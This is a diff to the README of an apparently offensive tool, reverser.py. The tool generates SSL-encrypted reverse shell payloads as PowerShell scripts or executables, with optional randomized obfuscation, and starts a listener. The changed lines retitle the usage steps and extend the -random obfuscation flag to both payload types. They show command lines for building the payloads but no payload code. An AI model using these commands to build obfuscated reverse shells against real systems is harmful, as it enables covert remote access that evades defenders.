@@ -16,7 +16,7 @@
 1. **Generating an SSL Certificate**:
    The tool automatically generates an SSL certificate and key that will be used to encrypt the reverse shell communication.
 
-2. **Generating a Payload**:
+2. **Generating a Payload with Obfuscation**:
    - To generate a PowerShell script:
      ```bash
      python3 reverser.py -ip <Your_IP> -port <Your_Port> -type ps1
@@ -26,10 +26,10 @@
      python3 reverser.py -ip <Your_IP> -port <Your_Port> -type exe
      ```
 
-3. **Randomized Obfuscation**:
+3. **Generating a Payload with Random Obfuscationn**:
    - To enable randomized obfuscation:
      ```bash
-     python3 reverser.py -ip <Your_IP> -port <Your_Port> -type exe -random
+     python3 reverser.py -ip <Your_IP> -port <Your_Port> -type <exe | ps1> -random
      ```
 
 4. **Starting an SSL Listener**:
